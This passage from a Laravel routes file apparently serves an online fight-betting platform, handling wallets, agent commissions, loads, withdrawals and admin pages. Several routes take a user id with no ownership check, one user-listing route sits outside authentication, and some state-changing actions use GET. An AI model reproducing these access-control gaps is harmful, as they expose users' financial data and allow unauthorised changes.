            ->orderBy('b.id','DESC')
            ->paginate(35);
        }
        return view('admin.wallet.comms',compact('myCommissions','user'));
    })->name('commission.logs');

    Route::get('/summary-commission',function(){
        $summary = [];
        $bets = 0;
        $events = Event::all();

        foreach($events as $ev){
            // if(Auth::user()->type == 'operator'){
            //     $bets = Bet::where('op_id',Auth::id())->where('event_id',$ev->id)->sum('operator_commission');
            // }

            // if(Auth::user()->type == 'sub-operator'){
            //     $bets = Bet::where('subop_id',Auth::id())->where('event_id',$ev->id)->sum('sub_operator_commission');
            // }

            // if(Auth::user()->type == 'master-agent'){
            //     $bets = Bet::where('ma_id',Auth::id())->where('event_id',$ev->id)->sum('master_agent_commission');
            // }

            // if(Auth::user()->type == 'gold-agent'){
            //     $bets = Bet::where('agent_id',Auth::id())->where('event_id',$ev->id)->sum('gold_agent_commission');
            // }

            // if(Auth::user()->type == 'silver-agent'){
            //     $bets = Bet::where('silver_id',Auth::id())->where('event_id',$ev->id)->sum('silver_agent_commission');
            // }

            $bets = DB::table('transactions as tx')
                        ->join('bets as b','b.id','=','tx.bet_id')
                        ->join('events as e','e.id','=','b.event_id')
                        ->where('tx.user_id',Auth::id())
                        ->where('tx.type','commission-in')
                        ->where('e.id',$ev->id)->sum('tx.amount');

            $summary[] = [
                'total' => $bets,
                'event_name' => $ev->name,
                'event_date' => date('m/d/Y',strtotime($ev->created_at)),
            ];
        }

        $summary = collect($summary);

        return view('admin.wallet.summary',compact('summary'));
    })->name('summary');

    Route::get('/load-logs', function () {
        $loads = \DB::table('transactions as tx')
                ->join('loads as l','l.id','=','tx.load_id')
                ->join('users as to','to.id','=','l.requested_by')
                ->join('users as fr','fr.id','=','l.requested_to')
                ->select('to.username as user_to','fr.username as user_from','tx.*')
                ->where('tx.user_id',Auth::id())
                ->orderBy('tx.id','DESC')
                ->get();

        return view('admin.wallet.loads',compact('loads'));
    })->name('load.logs');

    Route::get('/withdraw-logs', function () {
        $withdraws = \DB::table('transactions as tx')
                ->join('withdraws as w','w.id','=','tx.withdraw_id')
                ->join('users as to','to.id','=','w.requested_by')
                ->join('users as fr','fr.id','=','w.requested_to')
                ->select('to.username as user_to','fr.username as user_from','tx.*')
                ->where('tx.user_id',Auth::id())
                ->orderBy('tx.id','DESC')
                ->get();

        return view('admin.wallet.withdraws',compact('withdraws'));
    })->name('withdraw.logs');

    Route::get('/player-transactions', function () {
        if(Auth::user()->type != 'player'){
            return redirect()->route('dashboard');
        }
        $trans = Transaction::where('user_id',Auth::id())->orderBy('id','DESC')->get();
        return view('client.wallet',compact('trans'));
    })->name('player.txs');

    Route::get('/wallet', function () {
        $myCommissions = [];
        $bets = [];
        $refunds = [];
        $loads = \DB::table('transactions as tx')
                ->join('loads as l','l.id','=','tx.load_id')
                ->join('users as to','to.id','=','l.requested_by')
                ->join('users as fr','fr.id','=','l.requested_to')
                ->select('to.username as user_to','fr.username as user_from','tx.*')
                ->where('tx.user_id',Auth::id())
                ->orderBy('tx.id','DESC')
                ->get();

        $withdraws = \DB::table('transactions as tx')
                ->join('withdraws as w','w.id','=','tx.withdraw_id')
                ->join('users as to','to.id','=','w.requested_by')
                ->join('users as fr','fr.id','=','w.requested_to')
                ->select('to.username as user_to','fr.username as user_from','tx.*')
                ->where('tx.user_id',Auth::id())
                ->orderBy('tx.id','DESC')
                ->get();

        if(Auth::user()->type == 'operator'){
            // $myCommissions = \App\Models\Bet::where('op_id',Auth::id())->orderBy('id','DESC')->get();

            $myCommissions = DB::table('transactions as tx')
            ->join('bets as b','b.id','=','tx.bet_id')
            ->join('fights as f','f.id','=','b.fight_id')
            ->join('events as e','e.id','=','b.event_id')
            ->select('b.*','f.fight_number','e.name as event_name','tx.ending_balance')
            ->where('tx.user_id',Auth::id())
            ->where('tx.type','commission-in')
            ->orderBy('b.id','DESC')
            ->get();
        }

        if(Auth::user()->type == 'sub-operator'){
            // $myCommissions = \App\Models\Bet::where('subop_id',Auth::id())->orderBy('id','DESC')->get();
            $myCommissions = DB::table('transactions as tx')
            ->join('bets as b','b.id','=','tx.bet_id')
            ->join('fights as f','f.id','=','b.fight_id')
            ->join('events as e','e.id','=','b.event_id')
            ->select('b.*','f.fight_number','e.name as event_name','tx.ending_balance')
            ->where('tx.user_id',Auth::id())
            ->where('tx.type','commission-in')
            ->orderBy('b.id','DESC')
            ->get();
        }

        if(Auth::user()->type == 'master-agent'){
            // $myCommissions = \App\Models\Bet::where('ma_id',Auth::id())->orderBy('id','DESC')->get();
            $myCommissions = DB::table('transactions as tx')
            ->join('bets as b','b.id','=','tx.bet_id')
            ->join('fights as f','f.id','=','b.fight_id')
            ->join('events as e','e.id','=','b.event_id')
            ->select('b.*','f.fight_number','e.name as event_name','tx.ending_balance')
            ->where('tx.user_id',Auth::id())
            ->where('tx.type','commission-in')
            ->orderBy('b.id','DESC')
            ->get();
        }

        if(Auth::user()->type == 'gold-agent'){
            // $myCommissions = \App\Models\Bet::where('agent_id',Auth::id())->orderBy('id','DESC')->get();
            $myCommissions = DB::table('transactions as tx')
            ->join('bets as b','b.id','=','tx.bet_id')
            ->join('fights as f','f.id','=','b.fight_id')
            ->join('events as e','e.id','=','b.event_id')
            ->select('b.*','f.fight_number','e.name as event_name','tx.ending_balance')
            ->where('tx.user_id',Auth::id())
            ->where('tx.type','commission-in')
            ->orderBy('b.id','DESC')
            ->get();
        }

        if(Auth::user()->type == 'silver-agent'){
            // $myCommissions = \App\Models\Bet::where('silver_id',Auth::id())->orderBy('id','DESC')->get();
            $myCommissions = DB::table('transactions as tx')
            ->join('bets as b','b.id','=','tx.bet_id')
            ->join('fights as f','f.id','=','b.fight_id')
            ->join('events as e','e.id','=','b.event_id')
            ->select('b.*','f.fight_number','e.name as event_name','tx.ending_balance')
            ->where('tx.user_id',Auth::id())
            ->where('tx.type','commission-in')
            ->orderBy('b.id','DESC')
            ->get();
        }

        if(Auth::user()->type == 'player'){
            $bets = \DB::table('transactions as tx')
                ->join('bets as b','b.id','=','tx.bet_id')
                ->join('fights as f','f.id','=','b.fight_id')
                ->join('events as e','e.id','=','f.event_id')
                ->select('e.event_id','e.name as event_name','f.fight_number','b.*','tx.direction','tx.ending_balance','tx.remarks')
                ->where('tx.user_id',Auth::id())
                ->orderBy('tx.id','DESC')
                ->get();

            $refunds = \DB::table('transactions as tx')
                    ->join('bets as b','b.id','=','tx.bet_id')
                    ->join('fights as f','f.id','=','b.fight_id')
                    ->join('events as e','e.id','=','f.event_id')
                    ->select('e.event_id','f.fight_number','b.*','tx.direction','tx.ending_balance','tx.remarks')
                    ->where('tx.user_id',Auth::id())
                    ->where('remarks','refund for draw fight')
                    ->orderBy('tx.id','DESC')
                    ->get();
        }
        return view('admin.wallet.index',compact('myCommissions','loads','withdraws','bets','refunds'));
    })->name('wallet');

    Route::get('/player-wallet-history/{id}', function ($id) {
        $myCommissions = [];
        $bets = [];
        $loads = \DB::table('transactions as tx')
                ->join('loads as l','l.id','=','tx.load_id')
                ->join('users as to','to.id','=','l.requested_by')
                ->join('users as fr','fr.id','=','l.requested_to')
                ->select('to.username as user_to','fr.username as user_from','tx.*')
                ->where('tx.user_id',$id)
                ->orderBy('tx.id','DESC')
                ->get();

        $withdraws = \DB::table('transactions as tx')
                ->join('withdraws as w','w.id','=','tx.withdraw_id')
                ->join('users as to','to.id','=','w.requested_by')
                ->join('users as fr','fr.id','=','w.requested_to')
                ->select('to.username as user_to','fr.username as user_from','tx.*')
                ->where('tx.user_id',$id)
                ->orderBy('tx.id','DESC')
                ->get();

        $bets = \DB::table('transactions as tx')
                ->join('bets as b','b.id','=','tx.bet_id')
                ->join('fights as f','f.id','=','b.fight_id')
                ->join('events as e','e.id','=','f.event_id')
                ->select('e.event_id','f.fight_number','b.*','tx.direction','tx.ending_balance','tx.remarks')
                ->where('tx.user_id',$id)
                ->orderBy('tx.id','DESC')
                ->get();

        $refunds = \DB::table('transactions as tx')
                ->join('bets as b','b.id','=','tx.bet_id')
                ->join('fights as f','f.id','=','b.fight_id')
                ->join('events as e','e.id','=','f.event_id')
                ->select('e.event_id','f.fight_number','b.*','tx.direction','tx.ending_balance','tx.remarks')
                ->where('tx.user_id',$id)
                ->where('remarks','refund for')
                ->orderBy('tx.id','DESC')
                ->get();

        return view('admin.players.wallet',compact('loads','withdraws','bets','refunds'));

    })->name('wallet.history');


    Route::get('/edit-profile', function () {
        return view('admin.settings.update-account');
    })->name('edit.profile');


    Route::get('/change-password', function () {
        return view('admin.settings.password');
    })->name('password.update');

    Route::post('/update-password',[UserController::class,'updatePassword'])->name('update.password');

    Route::post('/request-load',[WalletController::class,'requestLoad'])->name('request.load');
    Route::get('/approve-load/{id}',[WalletController::class,'approveLoadRequest'])->name('approve.load');
    Route::post('/request-withdraw',[WalletController::class,'requestWithdrawCommission'])->name('request.withdraw');
    Route::get('/approve-withdraw/{id}',[WalletController::class,'approveCommissionWithdraw'])->name('approve.withdraw');
    Route::post('/add-system-load',[WalletController::class,'addSystemBalance'])->name('system.load');

    Route::post('/convert-commission',[WalletController::class,'convertCommission'])->name('convert.commission');
    Route::post('/add-wallet-balance',[WalletController::class,'addWalletBalance'])->name('add.balance');
    Route::post('/set-commission-percent',[WalletController::class,'setCommission'])->name('set.commission');
    Route::get('/approve-credits-withdraw/{id}',[WalletController::class,'approveCreditsWithdrawal'])->name('approve.credits');
    Route::post('/request-credits-withrawal',[WalletController::class,'requestWithdrawCredits'])->name('request.credits.withdraw');

    Route::post('/return-credits',[WalletController::class,'returnCredits'])->name('return.credits');
    Route::post('/withdraw-commission',[WalletController::class,'withdrawCommission'])->name('withdraw.commission');

    Route::get('/load-history/{id}', function ($id) {
        if(Auth::user()->type == 'player'){
            return redirect()->route('select.game');
        }

        $loads = \DB::table('transactions as tx')
                ->join('loads as l','l.id','=','tx.load_id')
                ->join('users as to','to.id','=','l.requested_by')
                ->join('users as fr','fr.id','=','l.requested_to')
                ->select('to.username as user_to','fr.username as user_from','tx.*')
                ->where('tx.user_id',$id)
                ->orderBy('tx.id','DESC')
                ->get();

        $withdraws = \DB::table('transactions as tx')
                ->join('withdraws as w','w.id','=','tx.withdraw_id')
                ->join('users as to','to.id','=','w.requested_by')
                ->join('users as fr','fr.id','=','w.requested_to')
                ->select('to.username as user_to','fr.username as user_from','tx.*')
                ->where('tx.user_id',$id)
                ->orderBy('tx.id','DESC')
                ->get();

        return view('admin.load.index',compact('loads','withdraws'));
    })->name('load.history');


    Route::get('/agent-withdrawal', function () {
        if(Auth::user()->type == 'player'){
            return redirect()->route('select.game');
        }
        $withdrawals = \App\Models\Withdraw::where('requested_by',Auth::id())->get();
        return view('admin.agentwithdrawal.index',compact('withdrawals'));
    })->name('agent.withdrawal');

    Route::get('/settings', function () {
        if(Auth::user()->type == 'player'){
            return redirect()->route('select.game');
        }

        if(Auth::user()->type != 'super-admin'){
            return redirect()->route('dashboard');
        }

        $deduction = Setting::where('setting_name','player_deduction')->first();
        $ma = Setting::where('setting_name','master_agent_commission')->first();
        $agent = Setting::where('setting_name','agent_commission')->first();
        $plasada = Setting::where('setting_name','plasada')->first();
        $operator = Setting::where('setting_name','operator_commission')->first();
        $timer = Setting::where('setting_name','multiplier')->first();

        return view('admin.settings.index',compact('deduction','ma','agent','plasada','operator','timer'));

    })->name('settings');

    Route::post('/save-settings',[SettingsController::class,'saveSettings'])->name('save.settings');

    Route::get('/all-commissions', function () {
        if(Auth::user()->type == 'player'){
            return redirect()->route('select.game');
        }
        $maCommissions = \DB::table('bets as b')
                        ->join('users as u','u.id','=','b.ma_id')
                        ->select('u.name','b.*')
                        ->get();

        $aCommissions = \DB::table('bets as b')
                        ->join('users as u','u.id','=','b.agent_id')
                        ->select('u.name','b.*')
                        ->get();

        return view('admin.commissions.index',compact('aCommissions','maCommissions'));
    })->name('all.commissions');


    Route::get('/ma-commissions', function () {
        if(Auth::user()->type == 'player'){
            return redirect()->route('select.game');
        }
        $maCommissions = \DB::table('bets as b')
                        ->join('users as u','u.id','=','b.ma_id')
                        ->select('u.name','b.*')
                        ->where('b.ma_id',Auth::id())
                        ->where('b.agent_id',NULL)
                        ->get();

        $aCommissions = \DB::table('bets as b')
                        ->join('users as u','u.id','=','b.agent_id')
                        ->select('u.name','b.*')
                        ->where('b.ma_id',Auth::id())
                        ->get();

        return view('admin.masteragents.commissions',compact('aCommissions','maCommissions'));
    })->name('ma.commissions');

    Route::get('/archives', function () {
        if(Auth::user()->type == 'player'){
            return redirect()->route('select.game');
        }

        $archives = \App\Models\Archive::all();
        return view('admin.archive.index',compact('archives'));
    })->name('archives');

    Route::get('/games',function(){
        if(Auth::user()->type == 'player'){
            return redirect()->route('select.game');
        }
        $games = \App\Models\Game::all();
        return view('admin.games.index',compact('games'));
    })->name('games');

    Route::get('/create-game',function(){
        if(Auth::user()->type == 'player'){
            return redirect()->route('select.game');
        }
        return view('admin.games.create');
    })->name('create.game');

    Route::get('/edit-game/{id}',function($id){
        if(Auth::user()->type == 'player'){
            return redirect()->route('select.game');
        }
        $game = \App\Models\Game::find($id);
        return view('admin.games.edit',compact('game'));
    })->name('edit.game');

    Route::get('/delete-game/{id}',[GameController::class,'deleteGame'])->name('delete.game');
    Route::post('/insert-game',[GameController::class,'createGame'])->name('insert.game');
    Route::post('/update-game/{id}',[GameController::class,'updateGame'])->name('update.game');


    Route::get('/silver-agents', function () {

        if(Auth::user()->type == 'player'){
            return redirect()->route('select.game');
        }

        if(Auth::user()->type != 'admin' && Auth::user()->type != 'super-admin' && Auth::user()->type != 'gold-agent'){
            return redirect()->route('dashboard');
        }

        $agents = \App\Models\User::where('type','silver-agent')->get();

        if(Auth::user()->type == 'gold-agent'){
            $agents = \App\Models\User::where('type','silver-agent')->where('referred_by',Auth::id())->get();
        }

        return view('admin.silver-agents.index',compact('agents'));
    })->name('silver.agents');

    Route::get('/operators/{username?}', function ($username = null) {

        if(Auth::user()->type == 'player'){
            return redirect()->route('select.game');
        }

        if(Auth::user()->type != 'admin' && Auth::user()->type != 'super-admin'){
            return redirect()->route('dashboard');
        }

        if($username == null){
            $operators = \App\Models\User::where('type','operator')->paginate(15);
        }else{
            $operators = \App\Models\User::where('type','operator')->where('username', 'LIKE', '%'.$username.'%')->paginate(15);
        }

        return view('admin.operators.index',compact('operators'));
    })->name('operators');

    Route::get('/admins', function () {
        if(Auth::user()->type == 'player'){
            return redirect()->route('select.game');
        }

        if(Auth::user()->type != 'super-admin'){
            return redirect()->route('dashboard');
        }

        $admins = \App\Models\User::where('type','admin')->get();
        return view('admin.admins.index',compact('admins'));
    })->name('admins');

    Route::get('/declarators', function () {
        if(Auth::user()->type == 'player'){
            return redirect()->route('select.game');
        }

        if(Auth::user()->type != 'admin' && Auth::user()->type != 'super-admin'){
            return redirect()->route('dashboard');
        }

        $declarators = \App\Models\User::where('type','declarator')->get();
        return view('admin.declarators.index',compact('declarators'));
    })->name('declarators');


    Route::get('/logout',[UserController::class,'logoutUser'])->name('logout');

    Route::get('/all-events/{id}',function($id){
        $events = Event::all();

        return view('admin.players.events',compact('events','id'));
    })->name('player.events');

    Route::get('/player-bets/{id}/{eventID}',function($id,$eventID){
        $playerBets = \DB::table('bets as b')
        ->join('fights as f','f.id','=','b.fight_id')
        ->join('events as e','e.id','=','b.event_id')
        ->select('e.name as event_name','f.fight_number','b.*')
        ->where('b.user_id',$id)
        ->where('e.id',$eventID)
        ->get();

        // $playerBets = \DB::table('bets as b')
        // ->join('fights as f','f.id','=','b.fight_id')
        // ->join('events as e','e.id','=','b.event_id')
        // ->select('e.name as event_name','f.fight_number','b.*')
        // ->where('user_id',$id)
        // ->where('created_at','>','2022-11-02 14:04:37')
        // ->get();

        return view('admin.players.bets',compact('playerBets'));

    })->name('players.bets');


    Route::get('/show-fights/{id}',function($id){

        if(Auth::user()->type != 'super-admin' && Auth::user()->type != 'admin' && Auth::user()->type != 'declarator'){
            return redirect()->route('dashboard');
        }

        $fights = \App\Models\Fight::where('event_id',$id)->get();
        return view('admin.events.fights',compact('fights'));
    })->name('show.fights');

    Route::get('/show-bets/{id}',function($id){
        $fight = \App\Models\Fight::find($id);
        $bets = DB::table('bets as b')
                ->join('users as u','u.id','=','b.user_id')
                ->select('b.*','u.name','u.username')
                ->where('b.fight_id',$id)->orderBy('b.id','DESC')->get();
        $betMeron = \App\Models\Bet::where('fight_id',$id)->where('bet','meron')->sum('amount');
        $betWala = \App\Models\Bet::where('fight_id',$id)->where('bet','wala')->sum('amount');
        $settings = \App\Models\Setting::where('setting_name','player_deduction')->first();
        $playerDeduction = $settings->value;
        $odds = calculateOdds($betMeron,$betWala,$playerDeduction);
        return view('admin.events.bets',compact('bets','fight','odds'));
    })->name('show.bets');

    Route::get('/account-summary/{id}',function($id){
        $wallet = \App\Models\Wallet::where('user_id',$id)->first();
        $downLines = \DB::table('users as u')
                            ->join('wallets as w','w.user_id','=','u.id')
                            ->select('w.balance','w.commission','u.id as user_id')
                            ->where('u.created_by',$id)
                            ->get();
        $downLinesPoints = [];
        $downLinesCommi = [];

        foreach($downLines as $dlp){
            $user = \App\Models\User::find($id);
            $downLinesPoints[] = $dlp->balance;
            $downLinesCommi[] = $dlp->commission;

            $opDL = \DB::table('users as u')
            ->join('wallets as w','w.user_id','=','u.id')
            ->select('w.balance','w.commission','u.id as user_id')
            ->where('u.created_by',$dlp->user_id)
            ->get();

            foreach($opDL as $opdlp){
                $user = \App\Models\User::find($opdlp->user_id);
                $downLinesPoints[] = $opdlp->balance;
                $downLinesCommi[] = $opdlp->commission;

                $sopDL = \DB::table('users as u')
                ->join('wallets as w','w.user_id','=','u.id')
                ->select('w.balance','w.commission','u.id as user_id')
                ->where('u.created_by',$opdlp->user_id)
                ->get();

                foreach($sopDL as $sopdlp){
                    $user = \App\Models\User::find($sopdlp->user_id);
                    $downLinesPoints[] = $sopdlp->balance;
                    $downLinesCommi[] = $sopdlp->commission;

                    $maDL = \DB::table('users as u')
                    ->join('wallets as w','w.user_id','=','u.id')
                    ->select('w.balance','w.commission','u.id as user_id')
                    ->where('u.created_by',$sopdlp->user_id)
                    ->get();

                    foreach($maDL as $madlp){
                        $user = \App\Models\User::find($madlp->user_id);
                        $downLinesPoints[] = $madlp->balance;
                        $downLinesCommi[] = $madlp->commission;

                        $gaDL = \DB::table('users as u')
                        ->join('wallets as w','w.user_id','=','u.id')
                        ->select('w.balance','w.commission','u.id as user_id')
                        ->where('u.created_by',$madlp->user_id)
                        ->get();

                        foreach($gaDL as $gadlp){
                            $user = \App\Models\User::find($gadlp->user_id);
                            $downLinesPoints[] = $gadlp->balance;
                            $downLinesCommi[] = $gadlp->commission;

                            $saDL = \DB::table('users as u')
                            ->join('wallets as w','w.user_id','=','u.id')
                            ->select('w.balance','w.commission','u.id as user_id')
                            ->where('u.created_by',$gadlp->user_id)
                            ->get();

                            foreach($saDL as $sadlp){
                                $user = \App\Models\User::find($sadlp->user_id);
                                $downLinesPoints[] = $sadlp->balance;
                                $downLinesCommi[] = $sadlp->commission;
                            }

                        }

                    }

                }
            }

        }

        $totalCashin = \App\Models\Transaction::where('user_id',$id)
                                    ->where('type','load')
                                    ->where('direction','in')
                                    ->sum('amount');
        $totalCashOut = \App\Models\Transaction::where('user_id',$id)
                                    ->where('type','refund')
                                    ->where('direction','out')
                                    ->sum('amount');
        $playerDeposit = \App\Models\Transaction::where('user_id',$id)
                                    ->where('type','load')
                                    ->where('direction','out')
                                    ->sum('amount');
        $playerWithdraw = \App\Models\Transaction::where('user_id',$id)
                                    ->where('type','refund')
                                    ->where('direction','in')
                                    ->sum('amount');

        $totalCommiOut = \App\Models\Transaction::where('user_id',$id)
                            ->where('type','commission-out')
                            ->where('direction','out')
                            ->where('user_notes','like','%co%')
                            ->sum('amount');

        $totalCommi = \App\Models\Transaction::where('user_id',$id)
                            ->where('type','commission-in')
                            ->where('direction','in')
                            ->sum('amount');
        $totalCTW = \App\Models\Transaction::where('user_id',$id)
                            ->where('type','commission-out')
                            ->where('direction','out')
                            ->where('user_notes','like','%ctw%')
                            ->sum('amount');

        return response()->json([
            'currentPoints' => bcdiv($wallet->balance,1,2),
            'currentCommi' => bcdiv($wallet->commission,1,2),
            'downLinesPoints' => bcdiv(array_sum($downLinesPoints),1,2),
            'totalCashin' =>bcdiv($totalCashin,1,2),
            'totalCashOut' => bcdiv($totalCashOut,1,2),
            'playerDeposit' => bcdiv($playerDeposit,1,2),
            'playerWithdraw' => bcdiv($playerWithdraw,1,2),
            'downLinesCommi' => bcdiv(array_sum($downLinesCommi),1,2),
            'totalCommi' => bcdiv($totalCommi,1,2),
            'totalCommiOut' => bcdiv($totalCommiOut,1,2),
            'totalCTW' => bcdiv($totalCTW,1,2)
        ]);
    })->name('acc.summary');


});


Route::get('/all-users', function () {
    $accounts = User::where('status','active')->where('type','!=','super-admin')->get();
    return view('all',compact('accounts'));
})->name('all.users');
